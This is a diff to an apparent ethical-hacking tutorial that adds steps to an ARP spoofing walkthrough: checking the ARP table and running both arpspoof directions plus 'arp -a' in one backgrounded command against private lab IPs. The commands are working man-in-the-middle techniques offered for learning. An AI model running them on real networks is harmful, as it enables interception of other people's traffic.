@@ -44,6 +44,17 @@ sudo arpspoof -i eth0 -t 172.16.196.133 172.16.196.132
 ```bash
 sudo arpspoof -i eth0 -t 172.16.196.132 172.16.196.133
 ```
+
+Check the ARP table again to verify that the victim ip address has been removed when arp spoofing.
+```bash
+sudo arp -a
+```
+
+🔺In my case it all i one terminal so i will use '&' to allow multiple commands running simulatniously:
+
+```bash
+sudo arpspoof -i eth0 -t 172.16.196.132 172.16.196.133 & sudo arpspoof -i eth0 -t 172.16.196.133 172.16.196.132 & sudo arp -a
+```
 ___
 
 # Ethical Hacking: Wireless Networks
